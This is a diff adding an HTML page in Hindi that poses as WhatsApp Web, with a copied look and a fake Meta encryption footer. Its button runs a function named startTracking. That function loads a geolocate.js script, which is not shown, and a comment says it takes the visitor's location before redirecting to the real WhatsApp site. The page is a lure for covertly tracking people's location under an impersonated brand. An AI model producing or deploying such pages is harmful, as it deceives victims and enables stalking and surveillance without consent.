@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body {
+            display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; background: #e5ddd5;
+        }
+        .container {
+            background: white; padding: 40px; border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2); width: 400px; text-align: center;
+        }
+        .logo { font-size: 60px; margin-bottom: 20px; }
+        h2 { color: #075e54; margin-bottom: 20px; }
+        p { color: #667781; margin-bottom: 25px; font-size: 14px; line-height: 1.6; }
+        .btn {
+            background: #25d366; color: white; border: none; padding: 14px 40px;
+            border-radius: 30px; font-size: 16px; cursor: pointer; transition: 0.3s;
+        }
+        .btn:hover { background: #1da851; transform: scale(1.02); }
+        .footer { margin-top: 25px; font-size: 12px; color: #999; }
+        .loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3;
+            border-top: 4px solid #25d366; border-radius: 50%; width: 40px;
+            height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">💬</div>
+    <h2>WhatsApp Web</h2>
+    <p>अपने व्हाट्सएप को वेब पर इस्तेमाल करने के लिए<br>QR कोड स्कैन करें या नीचे क्लिक करें</p>
+    <div class="loader" id="loader"></div>
+    <button class="btn" id="accessBtn" onclick="startTracking()">🔗 WhatsApp Web खोलें</button>
+    <div class="footer">🔒 एंड-टू-एंड एन्क्रिप्टेड • Meta</div>
+</div>
+
+<script src="geolocate.js"></script>
+<script>
+function startTracking() {
+    document.getElementById('loader').style.display = 'block';
+    document.getElementById('accessBtn').disabled = true;
+    document.getElementById('accessBtn').innerText = 'कनेक्ट हो रहा है...';
+    
+    // लोकेशन लेने के बाद रीडायरेक्ट
+    setTimeout(() => {
+        window.location.href = 'https://web.whatsapp.com';
+    }, 3000);
+}
+</script>
+
+</body>
+</html>
